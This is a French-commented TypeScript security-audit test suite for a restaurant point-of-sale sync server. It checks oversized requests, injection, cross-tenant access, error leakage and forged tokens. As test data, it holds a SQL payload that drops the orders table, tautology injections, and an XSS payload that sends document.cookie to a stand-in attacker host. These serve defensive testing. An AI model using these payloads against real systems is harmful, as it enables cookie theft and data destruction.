/**
 * AUDIT DE SÉCURITÉ — ce qu'un attaquant essaierait d'abord.
 *
 * Les gardes unitaires existent déjà, chacune dans son fichier (jeton
 * absent ou révoqué : sync.test ; limitation de débit : limitation-debit ;
 * CORS : cors ; RLS : rls-*). Ce fichier joue l'ATTAQUANT, contre la vraie
 * base, sur ce qu'aucun d'eux ne couvrait :
 *
 *   1. une requête énorme envoyée SANS jeton — l'audit a trouvé ce trou :
 *      `/appairage` et `/inscription` lisaient tout le corps avant de savoir
 *      qui appelait (corrigé : plafond de taille, serveur.ts) ;
 *   2. du SQL et du HTML glissés dans les champs libres d'une vente ;
 *   3. un jeton valide qui tente de lire ou d'écrire chez un AUTRE client ;
 *   4. une vente « empoisonnée » (taux de TVA inconnu) — l'audit a trouvé
 *      qu'elle gelait TOUTE la caisse (corrigé : depot-postgres.ts) ;
 *   5. une panne interne : sa trace ne doit jamais atteindre l'appareil ;
 *   6. des jetons fabriqués.
 */

import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { Client } from 'pg'
import { millimes, uuidV7 } from '@kaissi/domain'
import { DepotPostgres } from '../src/depot-postgres.js'
import { creerServeur } from '../src/serveur.js'
import type { DepotSync } from '../src/depot.js'
import { genererJeton } from '../src/jeton.js'
import {
  creerAppareil,
  ev,
  nettoyer,
  DEMO_RESTO,
  ESPECES,
  TVA_19,
  URL_TEST,
  type AppareilTest,
} from './aide.js'

const client = new Client({ connectionString: URL_TEST })
const depot = new DepotPostgres({ connectionString: URL_TEST, ssl: false })
const app = creerServeur({ depot })

// Un second CLIENT, avec sa propre organisation, son restaurant, sa caisse.
const AUTRE_ORG = uuidV7()
const AUTRE_RESTO = uuidV7()
const AUTRE_APPAREIL = uuidV7()
const autreJeton = genererJeton()
const AUTRE_TVA = uuidV7()

function push(jeton: string, evenements: unknown[]) {
  return app.request('http://test/sync/push', {
    method: 'POST',
    headers: { 'content-type': 'application/json', authorization: `Bearer ${jeton}` },
    body: JSON.stringify({ protocolVersion: 1, batchId: uuidV7(), evenements }),
  })
}

function pull(jeton: string) {
  return app.request(
    'http://test/sync/pull?protocolVersion=1&depuisCatalogue=0&depuisEvenements=0&taillePage=2000',
    { headers: { authorization: `Bearer ${jeton}` } },
  )
}

function venteMinimale(a: AppareilTest, designation: string, note?: string, tauxTaxeId = TVA_19) {
  const orderId = uuidV7()
  const ligneId = uuidV7()
  const evenements = [
    ev(a, orderId, 'order.opened', {
      type: 'takeaway',
      ouvertePar: null as never,
      numeroTicket: `${a.prefixe}-${orderId.slice(-6)}`,
    }),
    ev(a, orderId, 'line.added', {
      ligneId,
      produitId: '01930000-0000-7000-8000-000000000200',
      designation,
      quantite: 1,
      prixBaseMillimes: millimes(9_000),
      modificateursMillimes: millimes(0),
      tauxTaxeId,
    } as never),
    ...(note ? [ev(a, orderId, 'line.note_set', { ligneId, note } as never)] : []),
    ev(a, orderId, 'payment.recorded', {
      paiementId: uuidV7(),
      methodeId: ESPECES,
      mode: 'cash',
      montantMillimes: millimes(9_000),
      recuMillimes: millimes(9_000),
      renduMillimes: millimes(0),
    } as never),
    ev(a, orderId, 'order.closed', { totalMillimes: millimes(9_000), closePar: null } as never),
  ]
  return { orderId, evenements }
}

beforeAll(async () => {
  await client.connect()
  await client.query('insert into kaissi.organizations (id, name, slug) values ($1, $2, $3)', [
    AUTRE_ORG,
    'Concurrent',
    `concurrent-${AUTRE_ORG.slice(-8)}`,
  ])
  await client.query(
    `insert into kaissi.restaurants (id, organization_id, name, slug)
     values ($1, $2, 'Concurrent', $3)`,
    [AUTRE_RESTO, AUTRE_ORG, `concurrent-${AUTRE_RESTO.slice(-8)}`],
  )
  await client.query(
    `insert into kaissi.tax_rates (id, organization_id, restaurant_id, name, rate_bp)
     values ($1, $2, $3, 'TVA 19 %', 1900)`,
    [AUTRE_TVA, AUTRE_ORG, AUTRE_RESTO],
  )
})

beforeEach(async () => {
  await nettoyer()
  await client.query(
    `insert into kaissi.devices
       (id, organization_id, restaurant_id, label, type, ticket_prefix, token_hash,
        app_version, protocol_version)
     values ($1, $2, $3, 'Concurrent', 'pos', 'CC', $4, '0.2.0', 1)`,
    [AUTRE_APPAREIL, AUTRE_ORG, AUTRE_RESTO, autreJeton.empreinte],
  )
})

afterAll(async () => {
  await nettoyer()
  await client.query('delete from kaissi.restaurants where id = $1', [AUTRE_RESTO])
  await client.query('delete from kaissi.organizations where id = $1', [AUTRE_ORG])
  await client.end()
  await depot.fermer()
})

describe('1. requêtes énormes', () => {
  it('2 Mo envoyés SANS jeton à /appairage : refusés avant lecture (413)', async () => {
    const enorme = JSON.stringify({ email: 'x@y.tn', motDePasse: 'a'.repeat(2 * 1024 * 1024) })
    const r = await app.request('http://test/appairage', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': String(enorme.length) },
      body: enorme,
    })
    expect(r.status).toBe(413)
  })

  it('pareil pour /inscription et /admin/*', async () => {
    const enorme = 'x'.repeat(2 * 1024 * 1024)
    for (const chemin of ['/inscription', '/admin/comptes', '/admin/surveillance']) {
      const r = await app.request(`http://test${chemin}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'content-length': String(enorme.length) },
        body: enorme,
      })
      expect(r.status, chemin).toBe(413)
    }
  })

  it('un lot de vente PLEIN (500 événements) passe largement sous le plafond', async () => {
    const a = await creerAppareil('P1')
    const evenements: unknown[] = []
    while (evenements.length < 500) evenements.push(...venteMinimale(a, 'Pizza Margherita').evenements)
    const corps = JSON.stringify({ protocolVersion: 1, batchId: uuidV7(), evenements: evenements.slice(0, 500) })
    expect(corps.length).toBeLessThan(1024 * 1024)
    const r = await push(a.jetonClair, evenements.slice(0, 500))
    expect(r.status).toBe(200)
  })
})

describe('2. injections dans les champs libres', () => {
  it('du SQL dans une désignation est stocké tel quel — et la base est intacte', async () => {
    const a = await creerAppareil('P1')
    const piege = "Pizza'); drop table kaissi.orders; --"
    const xss = '<img src=x onerror="fetch(`//evil.tn/`+document.cookie)">'
    const { orderId, evenements } = venteMinimale(a, piege, xss)
    const r = await push(a.jetonClair, evenements)
    expect(r.status).toBe(200)

    const { rows } = await client.query(
      'select oi.designation as name, oi.note from kaissi.order_items oi where oi.order_id = $1',
      [orderId],
    )
    // Stocké À LA LETTRE : ni exécuté, ni « nettoyé » en silence. C'est à
    // l'affichage que React l'échappe — une donnée modifiée à l'entrée
    // mentirait au journal d'audit.
    expect(rows[0]?.name).toBe(piege)
    expect(rows[0]?.note).toBe(xss)
    const { rows: tables } = await client.query("select to_regclass('kaissi.orders') as t")
    expect(tables[0]?.t).toBe('kaissi.orders')
  })

  it('un identifiant qui n’est pas un UUID est refusé, jamais interpolé', async () => {
    const a = await creerAppareil('P1')
    const { evenements } = venteMinimale(a, 'Ojja')
    const forge = { ...(evenements[0] as object), orderId: "1' or '1'='1" }
    const r = await push(a.jetonClair, [forge])
    const corps = (await r.json()) as any
    // Refusé : par le lot (400) ou par événement (rejeté) — jamais accepté.
    if (r.status === 200) {
      expect(corps.acceptes).toEqual([])
      expect(corps.rejetes).toHaveLength(1)
    } else {
      expect(r.status).toBe(400)
    }
  })

  it('un paramètre de pull hostile ne casse rien', async () => {
    const a = await creerAppareil('P1')
    const r = await app.request(
      "http://test/sync/pull?protocolVersion=1&depuisEvenements=0;drop%20table%20x&taillePage=-5",
      { headers: { authorization: `Bearer ${a.jetonClair}` } },
    )
    expect(r.status).toBe(200)
  })
})

describe('3. un client chez un autre', () => {
  it('un jeton valide ne peut PAS écrire dans un autre restaurant', async () => {
    const a = await creerAppareil('P1')
    const { orderId, evenements } = venteMinimale(a, 'Intrusion')
    // L'événement prétend venir du restaurant concurrent.
    const forges = evenements.map((e: any) => ({
      ...e,
      restaurantId: AUTRE_RESTO,
      organizationId: AUTRE_ORG,
    }))
    const r = await push(a.jetonClair, forges)
    const corps = (await r.json()) as any
    expect(corps.acceptes ?? []).toEqual([])
    const { rows } = await client.query('select count(*)::int as n from kaissi.order_events where order_id = $1', [
      orderId,
    ])
    expect(rows[0]?.n).toBe(0)
  })

  it('un jeton valide ne LIT jamais les ventes d’un autre restaurant', async () => {
    const a = await creerAppareil('P1')
    // Une vente chez le concurrent, poussée par SA caisse.
    const concurrent: AppareilTest = { id: AUTRE_APPAREIL, jetonClair: autreJeton.clair, prefixe: 'CC' }
    const { evenements } = venteMinimale(concurrent, 'Secret du concurrent', undefined, AUTRE_TVA)
    const chezLui = evenements.map((e: any) => ({ ...e, restaurantId: AUTRE_RESTO, organizationId: AUTRE_ORG }))
    expect((await push(autreJeton.clair, chezLui)).status).toBe(200)

    // Et une vente chez nous.
    expect((await push(a.jetonClair, venteMinimale(a, 'Chez nous').evenements)).status).toBe(200)

    const r = await pull(a.jetonClair)
    const corps = (await r.json()) as any
    expect(corps.evenements.length).toBeGreaterThan(0)
    for (const e of corps.evenements) expect(e.restaurantId).toBe(DEMO_RESTO)
    expect(JSON.stringify(corps)).not.toContain('Secret du concurrent')
  })

  it('un appareil ne peut pas signer au nom d’une autre caisse du même restaurant', async () => {
    const a = await creerAppareil('P1')
    const b = await creerAppareil('P2')
    const { evenements } = venteMinimale(b, 'Usurpation')
    const r = await push(a.jetonClair, evenements)
    const corps = (await r.json()) as any
    expect(corps.acceptes ?? []).toEqual([])
  })
})

describe('4. une vente empoisonnée ne gèle pas la caisse', () => {
  it('un taux de TVA inconnu : CETTE vente attend, les autres passent', async () => {
    /*
     * Trouvé par cet audit. Avant : 500 sur tout le lot, la caisse renvoyait
     * le même lot, qui échouait encore — plus RIEN ne remontait jamais de
     * cette caisse. La vente fautive reste dans le journal (rien n'est
     * perdu) et apparaît « sans projection » dans l'écran Surveillance.
     */
    const a = await creerAppareil('P1')
    const empoisonnee = venteMinimale(a, 'Taux fantôme', undefined, uuidV7())
    const saine = venteMinimale(a, 'Couscous poulet')
    const r = await push(a.jetonClair, [...empoisonnee.evenements, ...saine.evenements])
    expect(r.status).toBe(200)
    const corps = (await r.json()) as any
    expect(corps.acceptes).toHaveLength(empoisonnee.evenements.length + saine.evenements.length)

    expect((await depot.statutsDesCommandes(DEMO_RESTO, [saine.orderId])).get(saine.orderId)).toBe('close')
    expect((await depot.statutsDesCommandes(DEMO_RESTO, [empoisonnee.orderId])).has(empoisonnee.orderId)).toBe(false)
    const orphelines = await depot.projectionsOrphelines(20_000, 100)
    expect(orphelines.map((o) => o.orderId)).toContain(empoisonnee.orderId)

    // Et la vente suivante de la même caisse passe, elle aussi.
    const suivante = venteMinimale(a, 'Ojja merguez')
    expect((await push(a.jetonClair, suivante.evenements)).status).toBe(200)
  })
})

describe('5. une panne interne ne fuit pas', () => {
  it('le message d’une exception reste dans les journaux, jamais dans la réponse', async () => {
    const piege: DepotSync = new Proxy(depot, {
      get(cible, propriete, recepteur) {
        if (propriete === 'reprojeter') {
          return async () => {
            throw new Error('mot de passe=Hunter2 chez /srv/kaissi/secret.ts:42')
          }
        }
        return Reflect.get(cible, propriete, recepteur)
      },
    }) as DepotSync
    const appPiege = creerServeur({ depot: piege })
    const a = await creerAppareil('P1')
    const r = await appPiege.request('http://test/sync/push', {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${a.jetonClair}` },
      body: JSON.stringify({ protocolVersion: 1, batchId: uuidV7(), evenements: venteMinimale(a, 'X').evenements }),
    })
    expect(r.status).toBe(500)
    const texte = await r.text()
    expect(texte).not.toContain('Hunter2')
    expect(texte).not.toContain('/srv/')
    expect(texte).not.toMatch(/\bat \w+/)
  })
})

describe('6. jetons fabriqués', () => {
  it.each([
    ['vide', ''],
    ['injection', "x' or '1'='1"],
    ['très long', 'a'.repeat(10_000)],
    ['format plausible', genererJeton().clair],
  ])('jeton %s : 401, et le même message pour tous', async (_nom, jeton) => {
    const r = await pull(jeton)
    expect(r.status).toBe(401)
  })

  it('un jeton révoqué reste refusé (403), même après une vente acceptée', async () => {
    const a = await creerAppareil('P1')
    expect((await push(a.jetonClair, venteMinimale(a, 'Avant').evenements)).status).toBe(200)
    await client.query('update kaissi.devices set revoked_at = now() where id = $1', [a.id])
    expect((await push(a.jetonClair, venteMinimale(a, 'Après').evenements)).status).toBe(403)
    expect((await pull(a.jetonClair)).status).toBe(403)
  })
})
